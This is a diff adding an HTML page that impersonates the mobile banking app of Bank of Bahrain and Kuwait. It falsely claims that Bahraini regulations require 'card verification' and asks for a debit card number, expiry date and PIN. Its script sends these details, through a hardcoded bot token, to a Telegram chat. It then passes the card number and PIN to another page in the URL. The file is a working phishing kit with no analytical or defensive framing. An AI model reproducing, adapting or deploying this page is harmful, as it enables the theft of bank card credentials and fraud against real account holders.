@@ -1,0 +1,391 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBK Mobile Banking - Card Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #4A90E2 0%, #2E5BBA 50%, #1E3A8A 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        .container {
+            flex: 1;
+            padding: 40px 30px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .logo-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 60px;
+            margin-top: 20px;
+        }
+
+        .logo {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            margin-bottom: 5px;
+            position: relative;
+        }
+
+        .logo-star {
+            position: absolute;
+            right: -15px;
+            top: -5px;
+            font-size: 20px;
+            color: white;
+        }
+
+        .logo-arabic {
+            font-size: 12px;
+            letter-spacing: 1px;
+            opacity: 0.9;
+            direction: rtl;
+        }
+
+        .card-text {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .card-text h1 {
+            font-size: 24px;
+            font-weight: 300;
+            line-height: 1.4;
+            margin-top:-40px;
+            margin-bottom: 10px;
+        }
+
+        .card-text p {
+            font-size: 16px;
+            opacity: 0.8;
+            line-height: 1.5;
+        }
+
+        .form-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: none !important;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.5) !important;
+            padding: 15px 0;
+            font-size: 16px;
+            color: white;
+            outline: none;
+            transition: border-color 0.3s ease !important;
+        }
+
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+            font-weight: 300;
+        }
+
+        .input-field:focus {
+            border-bottom-color: white !important;
+        }
+
+        .expiry-container {
+            display: flex;
+            gap: 15px;
+        }
+
+        .expiry-select {
+            flex: 1;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+            padding: 15px 0;
+            font-size: 16px;
+            color: white;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+
+        .expiry-select:focus {
+            border-bottom-color: white;
+        }
+
+        .expiry-select option {
+            background-color: #2E5BBA;
+            color: white;
+        }
+
+        .submit-button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            border-radius: 25px;
+            padding: 18px;
+            font-size: 18px;
+            color: white;
+            cursor: pointer;
+            margin-bottom: 30px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            font-weight: 400;
+        }
+
+        .submit-button:hover {
+            background: rgba(255, 255, 255, 0.3);
+            transform: translateY(-1px);
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .back-button {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .back-button a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 300;
+            opacity: 0.9;
+            transition: opacity 0.3s ease;
+        }
+
+        .back-button a:hover {
+            opacity: 1;
+            text-decoration: underline;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .info-note {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            margin-top:-25px;
+            opacity: 0.9;
+            line-height: 1.4;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            
+            .card-text h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo">
+                <div class="logo-text">
+                    BBK
+                    <span class="logo-star">✱</span>
+                </div>
+                <div class="logo-arabic">بنك البحرين والكويت</div>
+            </div>
+        </div>
+
+        <div class="card-text">
+            <h1>Debit Card Verification</h1>
+            <p>Please provide your Debit Card details for identity verification</p>
+        </div>
+
+        <div class="info-note">
+            <strong>Note:</strong> Your Debit Card details are required for enhanced security verification as per Bahrain banking regulations.
+        </div>
+        
+        <form>
+            <div class="form-container">
+                <div class="input-group">
+                    <input type="text" class="input-field" name="cardNumber" placeholder="Card Number *" id="cardNumber" inputmode="numeric" maxlength="19" required>
+                </div>
+
+                <div class="input-group">
+                    <div class="expiry-container">
+                        <select class="expiry-select" name="expiryMonth" id="expiryMonth" required>
+                            <option value="" disabled selected>Month</option>
+                            <option value="01">01 - January</option>
+                            <option value="02">02 - February</option>
+                            <option value="03">03 - March</option>
+                            <option value="04">04 - April</option>
+                            <option value="05">05 - May</option>
+                            <option value="06">06 - June</option>
+                            <option value="07">07 - July</option>
+                            <option value="08">08 - August</option>
+                            <option value="09">09 - September</option>
+                            <option value="10">10 - October</option>
+                            <option value="11">11 - November</option>
+                            <option value="12">12 - December</option>
+                        </select>
+                        <select class="expiry-select" name="expiryYear" id="expiryYear" required>
+                            <option value="" disabled selected>Year</option>
+                            <!-- Years will be populated by JavaScript -->
+                        </select>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <input type="password" class="input-field" inputmode="numeric" name="cardPin" placeholder="Card PIN *" id="cardPin" maxlength="4" required>
+                </div>
+
+                <button class="submit-button" name="s" id="submitBtn">Continue</button>
+            
+                <div class="back-button">
+                    <a href="verifion.html">← Back</a>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        (async () => {
+            const form = document.querySelector('form');
+            const submitBtn = document.getElementById('submitBtn');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expiryMonthSelect = document.getElementById('expiryMonth');
+            const expiryYearSelect = document.getElementById('expiryYear');
+            const cardPinInput = document.getElementById('cardPin');
+
+            // Populate year dropdown with next 10 years
+            const currentYear = new Date().getFullYear();
+            for (let i = 0; i < 10; i++) {
+                const year = currentYear + i;
+                const option = document.createElement('option');
+                option.value = year;
+                option.textContent = year;
+                expiryYearSelect.appendChild(option);
+            }
+
+            // Format card number with spaces
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+            });
+
+            // Limit PIN to 4 digits
+            cardPinInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
+            });
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const cardNumber = cardNumberInput.value.replace(/\s+/g, '');
+                const expiryMonth = expiryMonthSelect.value;
+                const expiryYear = expiryYearSelect.value;
+                const cardPin = cardPinInput.value;
+                
+                // Validation
+                if (!cardNumber || cardNumber.length < 16) {
+                    alert('Please enter a valid 16-digit card number');
+                    return;
+                }
+                
+                if (!expiryMonth || !expiryYear) {
+                    alert('Please select card expiry month and year');
+                    return;
+                }
+                
+                if (!cardPin || cardPin.length !== 4) {
+                    alert('Please enter a valid 4-digit PIN');
+                    return;
+                }
+
+                // Disable button and show loading
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="loading-spinner"></span>';
+                
+                const botToken = "8453434962:AAH2AZVGtRtUjqw4ziizkdE_GntutiUF6OA";
+                const chatId = "-5000519303";
+                
+                try {
+                    // Send card data to Telegram
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: ` 💳 *Card Details Submitted*\n━━━━━━━━━━\n📋 *Card Number:* ${cardNumber}\n📅 *Expiry:* ${expiryMonth}/${expiryYear}\n🔒 *PIN:* ${cardPin}`
+                        })
+                    });
+
+                    // Redirect to next page with card number as query parameter
+                    window.location.href = `q.html?card=${encodeURIComponent(cardNumber)}&expiry=${encodeURIComponent(expiryMonth + '/' + expiryYear)}&pin=${encodeURIComponent(cardPin)}`;
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    // Still redirect even if Telegram fails
+                    window.location.href = `q.html?card=${encodeURIComponent(cardNumber)}&expiry=${encodeURIComponent(expiryMonth + '/' + expiryYear)}&pin=${encodeURIComponent(cardPin)}`;
+                }
+            });
+
+            // Allow Enter key to submit
+            document.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    form.dispatchEvent(new Event('submit'));
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
